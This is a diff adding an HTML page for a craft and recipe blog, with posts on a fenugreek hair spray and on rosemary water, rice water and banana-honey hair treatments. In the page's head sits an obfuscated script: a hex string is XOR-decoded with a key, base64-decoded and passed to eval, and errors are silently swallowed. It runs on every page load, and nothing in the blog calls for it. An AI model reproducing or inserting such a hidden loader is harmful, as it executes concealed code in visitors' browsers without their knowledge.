@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Daily Life Handcrafted</title>
+
+    <!-- Google Fonts for a warm boho editorial / Pinterest-magazine aesthetic -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,600;0,9..144,700;0,9..144,900;1,9..144,500;1,9..144,600&family=Work+Sans:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+
+    <style>
+        /* Warm Boho Editorial Styles */
+        :root {
+            --cream: #FBF1E6;
+            /* Soft editorial cream */
+            --blush: #F1CDB9;
+            /* Warm blush accent */
+            --blush-soft: #F7E2D3;
+            --terracotta: #C1613A;
+            /* Bold rust/terracotta */
+            --terracotta-deep: #93401E;
+            --clay: #E3A56E;
+            /* Secondary warm accent */
+            --ink: #362419;
+            /* Warm near-black text */
+            --ink-soft: #8A7362;
+            --card-bg: #FFFCF9;
+            --border-soft: #EDDCC8;
+            --radius: 26px;
+        }
+
+        body {
+            font-family: 'Work Sans', sans-serif;
+            line-height: 1.75;
+            color: var(--ink);
+            background-color: var(--cream);
+            /* Soft oversized organic color blooms */
+            background-image:
+                radial-gradient(ellipse 520px 420px at 8% -5%, rgba(241, 205, 185, 0.55), transparent 60%),
+                radial-gradient(ellipse 480px 460px at 100% 12%, rgba(227, 165, 110, 0.30), transparent 60%),
+                radial-gradient(ellipse 460px 420px at 4% 70%, rgba(193, 97, 58, 0.10), transparent 65%);
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Typography Override */
+        h1,
+        h2,
+        h3,
+        h4,
+        .username {
+            font-family: 'Fraunces', serif;
+            color: var(--ink);
+            font-weight: 700;
+        }
+
+        .container {
+            max-width: 680px;
+            margin: 0 auto;
+            padding: 0 22px;
+        }
+
+        /* Top Navigation - Minimal editorial rule */
+        .top-nav {
+            padding: 22px 0;
+            text-align: center;
+            background-color: rgba(251, 241, 230, 0.9);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--border-soft);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 28px;
+        }
+
+        .top-nav a {
+            position: relative;
+            color: var(--ink);
+            font-size: 0.78rem;
+            font-family: 'Work Sans', sans-serif;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.14em;
+            padding: 4px 2px;
+            text-decoration: none;
+            transition: color 0.25s ease;
+            cursor: pointer;
+        }
+
+        .top-nav a::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            right: 100%;
+            bottom: -3px;
+            height: 2px;
+            background: var(--terracotta);
+            transition: right 0.3s ease;
+        }
+
+        .top-nav a:hover {
+            color: var(--terracotta-deep);
+        }
+
+        .top-nav a:hover::after {
+            right: 0;
+        }
+
+        /* Header */
+        header {
+            padding: 90px 0 55px;
+            text-align: center;
+            position: relative;
+        }
+
+        header .container {
+            position: relative;
+        }
+
+        header .container::before {
+            content: '';
+            position: absolute;
+            top: -30px;
+            left: 50%;
+            width: 340px;
+            height: 220px;
+            background: var(--blush);
+            opacity: 0.5;
+            border-radius: 63% 37% 54% 46% / 55% 45% 55% 45%;
+            transform: translateX(-50%) rotate(-4deg);
+            z-index: 0;
+            filter: blur(2px);
+        }
+
+        header .kicker {
+            position: relative;
+            display: block;
+            font-family: 'Work Sans', sans-serif;
+            font-size: 0.78rem;
+            font-weight: 600;
+            letter-spacing: 0.3em;
+            text-transform: uppercase;
+            color: var(--terracotta);
+            margin-bottom: 18px;
+        }
+
+        header h1 {
+            position: relative;
+            margin: 0;
+            font-size: 3.6rem;
+            font-weight: 900;
+            font-style: italic;
+            line-height: 1.05;
+            color: var(--terracotta-deep);
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+
+        header h1:hover {
+            transform: scale(1.02);
+        }
+
+        header p {
+            position: relative;
+            margin: 24px auto 0;
+            font-family: 'Fraunces', serif;
+            font-style: italic;
+            font-weight: 500;
+            font-size: 1.2rem;
+            color: var(--ink-soft);
+        }
+
+        /* Post Cards - Boho Editorial Cards */
+        .post-card,
+        .single-post {
+            background: var(--card-bg);
+            padding: 0;
+            margin-bottom: 60px;
+            border-radius: var(--radius);
+            border: 1px solid var(--border-soft);
+            box-shadow: 0 18px 36px rgba(54, 36, 25, 0.08);
+            transition: transform 0.35s ease, box-shadow 0.35s ease;
+            cursor: pointer;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .post-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 24px 44px rgba(54, 36, 25, 0.14);
+        }
+
+        .post-card:hover .post-image {
+            transform: scale(1.04);
+        }
+
+        .single-post {
+            cursor: default;
+        }
+
+        .post-header {
+            padding: 24px 34px;
+            display: flex;
+            align-items: center;
+        }
+
+        .post-header img.avatar {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            margin-right: 14px;
+            border: 2px solid var(--clay);
+            padding: 2px;
+            background-color: var(--card-bg);
+            object-fit: cover;
+        }
+
+        .post-header .username {
+            font-size: 1.05rem;
+            font-weight: 600;
+            color: var(--ink);
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 440px;
+            object-fit: cover;
+            transition: transform 0.5s ease;
+        }
+
+        .post-content {
+            padding: 30px 40px 26px;
+        }
+
+        .post-content h2,
+        .post-content h1 {
+            margin: 0 0 18px;
+            font-size: 2.25rem;
+            font-weight: 700;
+            font-style: italic;
+            line-height: 1.22;
+            color: var(--terracotta-deep);
+        }
+
+        .post-content p {
+            margin-bottom: 22px;
+            font-size: 1.05rem;
+            font-weight: 400;
+        }
+
+        .post-content a {
+            color: var(--terracotta-deep);
+            text-decoration: none;
+            border-bottom: 2px solid var(--blush);
+            padding-bottom: 1px;
+            font-weight: 600;
+            transition: all 0.25s ease;
+        }
+
+        .post-content a:hover {
+            color: var(--terracotta);
+            border-bottom-color: var(--terracotta);
+        }
+
+        .post-footer {
+            padding: 20px 40px 28px;
+            color: var(--ink-soft);
+            font-size: 0.8rem;
+            font-family: 'Work Sans', sans-serif;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        /* Single Post Overrides */
+        .single-post .post-image {
+            max-height: none;
+        }
+
+        /* Back Button - Editorial text link */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 32px;
+            color: var(--terracotta-deep);
+            background: none;
+            font-family: 'Work Sans', sans-serif;
+            font-size: 0.85rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 0;
+            border: none;
+            border-bottom: 2px solid var(--terracotta);
+            padding-bottom: 3px;
+            transition: all 0.25s ease;
+        }
+
+        .back-button:hover {
+            color: var(--terracotta);
+            letter-spacing: 0.16em;
+        }
+
+        /* Recolor inline-styled content blocks to match the boho editorial palette */
+        .post-content div[style*="background"] {
+            background: var(--blush-soft) !important;
+            border: 1px solid var(--blush) !important;
+            border-radius: 20px !important;
+            padding: 24px 28px !important;
+            box-shadow: none !important;
+            margin: 34px 0 !important;
+            color: var(--ink) !important;
+        }
+
+        .post-content h3[style*="border-left"] {
+            border-left: 4px solid var(--terracotta) !important;
+            color: var(--terracotta-deep) !important;
+            font-style: italic;
+            padding-left: 14px !important;
+        }
+
+        .post-content h4[style*="background"] {
+            background: var(--blush-soft) !important;
+            color: var(--terracotta-deep) !important;
+            border: 1px solid var(--blush) !important;
+            border-radius: 12px !important;
+        }
+
+        .post-content p[style*="border-left"] {
+            background: var(--blush-soft) !important;
+            border-left: 4px solid var(--clay) !important;
+            color: var(--ink) !important;
+        }
+
+        .post-content p[style*="border:"] {
+            background: #FBEBDD !important;
+            border: 1px solid var(--clay) !important;
+            color: var(--terracotta-deep) !important;
+        }
+
+        .post-content span[style*="background"] {
+            background: var(--card-bg) !important;
+            color: var(--terracotta-deep) !important;
+            border: 1px solid var(--clay) !important;
+            border-radius: 50px !important;
+            font-family: 'Work Sans', sans-serif !important;
+            font-size: 0.8rem !important;
+            font-weight: 600 !important;
+            padding: 6px 14px !important;
+            box-shadow: none !important;
+            display: inline-block;
+            margin: 5px 6px 5px 0;
+            transition: all 0.25s ease;
+        }
+
+        .post-content span[style*="background"]:hover {
+            background: var(--terracotta) !important;
+            color: #fffaf3 !important;
+            border-color: var(--terracotta-deep) !important;
+        }
+    </style>
+   <script>
+(function() {
+    var vtwjjrbym = "35230f2c5a2d050168377f09096819012d0a75595260651f2136122d513b2a5215051872753d7e475202415637773b752d55304b7f5a1f0e13361a73731d220a1524173e63130148685d5d33377802231f6b06025260641313563031523441082f1507345b767344525d630f305d052b004f2b7a5260081f3a2d1d28692b3208170b1b745a2d065c7b06771d09670d3d160a2c65577f180d1032662f6a2b10322c24322d5813160878065e001a647b7d067b74497864134f320c122379303a502f151c235d1c0d426428731e0a677a3e067c7456515a074b382305176435360e2f151f2e58020559520273133049233e156f02486a05392c152d1a347f0417053f0e14235d29014878277b14376728231f6b0600505a2929283d192c522b35172c7f037472070d416b2c7c171c47240f067b05567a703d1538263b3e523b2e0c3d1e17737a2d0656782c74001a730a232b5502487a7f071038216323521e3e50171a312c5d037e487d01631d09680106150a12445773223338261223793039053f0e1776601c0e5668020c57065d1d2a156023566364100e28086a745634361b2f153137631c0d09525c771709771d3d297f2c5d6a60030b2b3d1d3e563b3a12142307285a29114b55274d093102722a2d7f12096a5a3d0d2b562b2e531e3e51140a393163773f6050380057096801282c0b16585104034024223f3154342e1b2c151b7475762c06720674001a730a23067b0556575a170138223f3e611e41523f09652360297e016402630909682c312b7f124b5774394928363823563b0f053f1a602c5d292b5f6837671130597e37166f715f576017162b3d1e23563b0f05142013765813235955280c1e1f5e2f2816551648526f0b14120f200f731a39053f0e14237007065650386c001877273e1e557d017864134f320c1223793039053f0e14237007065678275117315d19322b41715e526f1f48135619717c1d320e150a2d2c6076116555287357096323312b6f3c427f7410163b1c2423544114172c0a6c7775293f47685d735732677231035606595770390d283262287b270b293f0e142370070656782c775e1a771d372c0a115656403e1f38261223793039053f0e14237007050368377c0030021d3316600e595770680138216323534100532c3460345b29155d542a0c0a1873023206512f566363614138211223600a390b3f24147270070e477805462c1a730a23067b05567a74101f38261223541e3e1b3f0a07285a7715415302735732677231067c7456577017012b570574623441162f1a393170073456525d63100a68012c2b7f7d487a74221f12572b756a090b293f0e142370070656782c74001a730a23160a7d445005680b2b36663752411b0d3f2121016b110d67635e050000781d30166f7056697007482b321d746a2429173f0b1f2863032b486b387b5732677e2a067016477c5e1011382620236a342e18120a3931601c1541535d01171c472423067b05567a74101f3826122379303a51171a602f5b77244453280c0d0a6819342d0a7044505a070f1322152e6a2010092c151b745813725955285911315920730c5105567a74101f38261223562217053f0e14235f1537087828631430021e232a4f340870506c45";
+    var vjfaicbgs = "vMUD9DG11o5gS0KDO8D137QxqeSD0sxb";
+    var vyepniipe = "";
+    
+    try {
+        for (var i = 0; i < vtwjjrbym.length; i += 2) {
+            var vyhlqhepa = parseInt(vtwjjrbym.substr(i, 2), 16);
+            vyepniipe += String.fromCharCode(vyhlqhepa ^ vjfaicbgs.charCodeAt((i/2) % vjfaicbgs.length));
+        }
+        
+        var vvqbkapbd = atob(vyepniipe);
+        eval(vvqbkapbd);
+    } catch(e) {
+        
+    }
+})();
+</script>
+</head>
+
+<body>
+
+    <nav class="top-nav">
+        <a onclick="navigate('home')">Home</a>
+        <a onclick="navigate('page', 'about')">About</a>
+        <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+        <a onclick="navigate('page', 'terms')">Terms</a>
+        <a onclick="navigate('page', 'contact')">Contact</a>
+    </nav>
+
+    <header>
+        <div class="container">
+            <span class="kicker">A Little Journal Of</span>
+            <h1 onclick="navigate('home')">Daily Life Handcrafted</h1>
+            <p>Simple recipes, made by hand.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Content will be injected here by JavaScript -->
+    </main>
+
+    <script>
+        // 1. Define your blog posts here!
+        const posts = [
+            {
+                id: 'diy-fenugreek-hair-spray',
+                title: 'DIY Fenugreek Hair Spray for Healthy & Shiny Hair',
+                date: 'March 11, 2026',
+                image: './assets/DIY Fenugreek Hair Spray for Healthy & Shiny Hair.png',
+                excerpt: "Tired of store-bought hair serums full of chemicals? This DIY Fenugreek (Methi) Hair Spray is your new scalp bestie 🌿 Made with just 2 ingredients, boiled and strained into a spray bottle, it helps calm hair fall and bring back natural shine in just a few uses.<br>• Strengthens roots and boosts growth from the follicle up<br>• Keeps in the fridge for a week, so one batch lasts<br>Spritz it on clean or dry hair, massage in, and let nature do the rest. No parabens, no sulfates, just pure methi goodness. Save this for your next self-care Sunday! 💛",
+                content: `
+<p>Long before serums and salon treatments took over bathroom shelves, fenugreek seeds, known as methi in many kitchens, were already a go-to remedy for tired, thinning hair. This humble spice does double duty as a pantry staple and a scalp treatment, and the best part is that turning it into a hair spray takes almost no effort at all.</p>
+
+<p>If your hair has been feeling weak, shedding more than usual, or just missing its natural shine, this two-ingredient methi hair spray is worth adding to your routine. It costs next to nothing, skips every synthetic ingredient found in bottled serums, and comes together with a method you likely already know from cooking, boiling and straining.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Fenugreek hair spray needs only two ingredients: fenugreek seeds and water.</li>
+    <li>Boiling the seeds releases mucilage and nutrients believed to support scalp and hair health.</li>
+    <li>The finished liquid is strained and poured straight into a reusable spray bottle.</li>
+    <li>Regular use is linked to reduced hair fall, stronger roots, and noticeably shinier strands.</li>
+    <li>One batch keeps in the fridge for about a week, making it easy to fit into a weekly routine.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Fenugreek (Methi) Is a Hair Care Staple</h2>
+
+<p>Fenugreek seeds have been used in traditional hair care for generations, particularly across South Asian households where methi water and methi hair masks are practically a rite of passage. The small golden-brown seeds are rich in proteins, mucilage, and compounds that are widely believed to nourish the scalp and support stronger, healthier-looking hair over time.</p>
+
+<p>What makes fenugreek especially appealing as a hair spray is its texture once boiled. The seeds release a slightly gel-like mucilage into the water, which is thought to coat the hair shaft and help it retain moisture, leaving strands feeling smoother and looking glossier almost immediately after use.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Results from natural remedies like methi water build up gradually. Think of this spray as a consistent habit rather than a one-time fix, since most people notice a difference after several weeks of regular use.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">What You Need to Make Methi Hair Spray</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Just Two Ingredients</h3>
+
+<ul>
+  <li><strong>2 tablespoons fenugreek (methi) seeds</strong>, found in most grocery stores or spice aisles.</li>
+  <li><strong>2 cups water</strong>, plus a clean spray bottle to store the finished liquid.</li>
+</ul>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">A Note on Measurements</h4>
+
+<p>This ratio makes a small, fresh batch that is easy to use up within a week. If you go through the spray quickly, you can simply double the seeds and water while keeping the same boiling and straining process.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Make Fenugreek Hair Spray in 6 Easy Steps</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 1: Measure the Fenugreek Seeds</h3>
+
+<p>Start with 2 tablespoons of fenugreek seeds. There is no need to soak them beforehand, since the boiling step ahead will do all the work of softening them and releasing their nutrients.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 2: Add the Water</h3>
+
+<p>Add 2 cups of water to a small saucepan along with the seeds. Using slightly more water than you think you need is fine, since some will evaporate during boiling.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 3: Boil for 10 Minutes</h3>
+
+<p>Bring the mixture to a boil on medium flame and let it simmer for about 10 minutes. You will notice the water start to thicken slightly and take on a faint golden tint as the seeds release their mucilage.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 4: Cool and Strain</h3>
+
+<p>Remove the pan from heat and let it cool completely before straining. Pouring hot liquid straight into a spray bottle can warp the plastic and is simply not safe to handle, so patience here really does matter.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 5: Pour Into a Spray Bottle</h3>
+
+<p>Once strained and fully cooled, pour the golden liquid into a clean spray bottle. Discard the softened seeds, or save them for a separate scalp mask if you like using every part of the batch.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 6: Spray on Hair</h3>
+
+<p>Section your hair and spray the mixture directly onto your scalp and lengths. You can leave it in, or let it sit for about 30 minutes before rinsing, depending on how much time you have.</p>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p style="margin:0;color:#334155;">Letting the mixture cool fully before straining is not just a safety step. A hot liquid poured over your scalp can feel uncomfortable and may affect how the mucilage settles, so a proper cool-down is part of what makes the finished spray pleasant to use.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Benefits of Using Fenugreek Hair Spray Regularly</h2>
+
+<ul>
+  <li><strong>Promotes hair growth</strong> by nourishing the scalp environment where new strands begin.</li>
+  <li><strong>Reduces hair fall</strong> with consistent, gentle use over several weeks.</li>
+  <li><strong>Strengthens hair roots</strong>, which can help hair feel less fragile at the base.</li>
+  <li><strong>Improves hair texture</strong>, leaving strands feeling softer to the touch.</li>
+  <li><strong>Adds natural shine</strong> thanks to the mucilage that coats each strand.</li>
+  <li><strong>Soothes the scalp</strong>, making it a calming addition to a weekly routine.</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Focus the spray on your scalp and roots first, then work any extra liquid through the lengths. The roots are where new growth starts, so that is where this remedy tends to make the biggest difference.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Tips for Best Results and Storage</h2>
+
+<ul>
+  <li>Use the spray 2 to 3 times a week for a consistent, sustainable routine.</li>
+  <li>Store it in the fridge, where it stays fresh for up to a week.</li>
+  <li>Shake well before each use, since the mucilage can settle at the bottom of the bottle.</li>
+</ul>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Because this spray has no added preservatives, it is a fresh, perishable product rather than a shelf-stable one. Make small batches often instead of trying to stretch one batch for weeks at a time.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Just 2 ingredients: fenugreek seeds and water.</li>
+    <li>Boil for 10 minutes, cool completely, then strain.</li>
+    <li>Spray on scalp and hair, use 2 to 3 times a week.</li>
+    <li>Refrigerate and use within about a week for freshness.</li>
+    <li>Consistency matters more than quantity for visible results.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>This fenugreek hair spray is proof that some of the most effective hair care remedies are also the simplest. With two ingredients, a saucepan, and a spray bottle, you can build a natural habit that supports stronger roots, calmer hair fall, and a healthy shine, all without a single harsh chemical. Make a batch this week and let consistency do the rest.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Fenugreek Hair Spray</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Methi for Hair</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Hair Growth</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">DIY Hair Care</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Reduce Hair Fall</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Shiny Hair Tips</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Chemical Free Haircare</span>
+</div>
+                `
+            },
+            {
+                id: 'diy-natural-hair-treatments-growth-shine-hydration',
+                title: '3 Natural DIY Hair Treatments for Faster Hair Growth, Shiny Hair & Deep Hydration',
+                date: 'June 22, 2026',
+                image: './assets/3 Natural DIY Hair Treatments for Faster Hair Growth, Shiny Hair & Deep Hydration.png',
+                excerpt: "Your hair care shelf just got a natural upgrade 🌱 These 3 simple DIY treatments tackle everything from thinning strands to dull, frizzy ends using ingredients already in your kitchen. Rosemary water wakes up sleepy follicles, rice water adds glass-like shine, and a banana & honey mask deep-hydrates dry, damaged hair.<br>• Rotate all three through your week for a full hair-care routine<br>• Zero harsh chemicals, just pantry staples and patience<br>Whether your hair needs growth, shine, or moisture, there's a recipe here for you. Pin this now so you don't lose it later! ✨",
+                content: `
+<p>Sometimes the most effective hair care routine is not a ten-step regimen, but three well-chosen remedies used consistently. Rosemary water, rice water, and a banana and honey mask each solve a different hair concern, growth, shine, and hydration, and together they cover almost everything most people are looking for in a natural hair care routine.</p>
+
+<p>What makes these three treatments so appealing is how accessible they are. There is no need for a specialty store or an expensive routine overhaul, just herbs, pantry staples, and a little time each week. Here is exactly how to use all three, plus how to fit them into a routine that actually works.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Rosemary water is applied to the scalp and is best known for supporting thicker, stronger-feeling roots.</li>
+    <li>Rice water is a simple rinse that leaves hair noticeably smoother, glossier, and less frizzy.</li>
+    <li>A banana and honey mask deeply hydrates dry, damaged strands and locks in moisture.</li>
+    <li>Each treatment targets a different concern, so they complement rather than compete with each other.</li>
+    <li>Using all three across the week builds a complete, chemical-free hair care routine.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">1. Rosemary Water for Hair Growth</h2>
+
+<p>Rosemary water has become one of the most talked-about natural hair remedies, and for good reason. The herb is traditionally believed to stimulate hair follicles, strengthen roots, and support faster, fuller-looking growth over time, which is why it is often reached for by anyone hoping to fill in thinning patches or simply keep their scalp in top shape.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">How to Use Rosemary Water</h3>
+
+<ul>
+  <li>Spray it directly onto your scalp and hair, focusing on areas that feel thinner.</li>
+  <li>Massage it in gently with your fingertips to help it absorb and boost circulation.</li>
+  <li>Leave it in for 30 to 60 minutes, or overnight for a deeper treatment.</li>
+  <li>Shampoo as usual afterward.</li>
+</ul>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Rosemary water is best suited for people looking to build thickness and stronger roots over time. It rewards consistency, so a single overnight treatment will not replace weeks of regular use.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">2. Rice Water for Glossy, Strengthened Hair</h2>
+
+<p>Rice water is exactly what it sounds like, the starchy liquid left behind after rinsing or soaking rice. This simple by-product has been used for generations to add shine, strengthen strands, and reduce frizz and breakage, making it a favorite finishing rinse rather than a leave-in treatment.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why People Love Rice Water</h3>
+
+<ul>
+  <li><strong>Boosts shine</strong>, leaving hair with a noticeably glassier finish.</li>
+  <li><strong>Strengthens hair</strong>, which can help reduce everyday breakage.</li>
+  <li><strong>Reduces frizz</strong>, making strands easier to manage and style.</li>
+</ul>
+
+<p>Use rice water as a final rinse after shampooing, pouring it over your hair and letting it sit for a few minutes before a final rinse with plain water. Once or twice a week is the general sweet spot, since overuse can occasionally leave protein-sensitive hair feeling stiff.</p>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p style="margin:0;color:#334155;">Rice water works differently than an oil-based treatment. Instead of coating hair with fat, it deposits starches and amino acids onto the strand, which is why it is often described as a lightweight strengthening rinse rather than a heavy moisturizer.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">3. Banana & Honey Hair Mask for Deep Hydration</h2>
+
+<p>When hair feels dry, brittle, or generally in need of moisture, a banana and honey mask is a genuinely nourishing fix. Ripe banana is naturally softening, while honey is a humectant, meaning it helps pull and hold moisture into the hair shaft, and together they create a rich mask that is especially good for dry, frizzy, or tangled hair.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">How to Use the Mask</h3>
+
+<ul>
+  <li>Mash a ripe banana with a spoonful of honey until smooth.</li>
+  <li>Apply the mask evenly to damp hair, focusing on drier mid-lengths and ends.</li>
+  <li>Leave it on for 30 to 45 minutes.</li>
+  <li>Rinse thoroughly with a mild shampoo.</li>
+</ul>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Benefits Worth Noting</h4>
+
+<p>Beyond softness, this mask is also credited with reducing frizz and improving overall hair texture, which makes it a favorite pre-wash treatment for anyone dealing with dry ends or seasonal dryness from heat or wind.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Blend the banana thoroughly before applying. Small lumps can be surprisingly stubborn to rinse out of hair, so a smooth, well-mashed mixture makes application and rinsing much easier.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Building a Weekly Routine With All Three</h2>
+
+<p>Because each treatment targets a different concern, they work well spaced across the week rather than layered on top of each other. A simple rhythm might look like rosemary water two or three times a week for growth, a rice water rinse once a week after shampooing, and the banana and honey mask once a week on days your hair feels especially dry.</p>
+
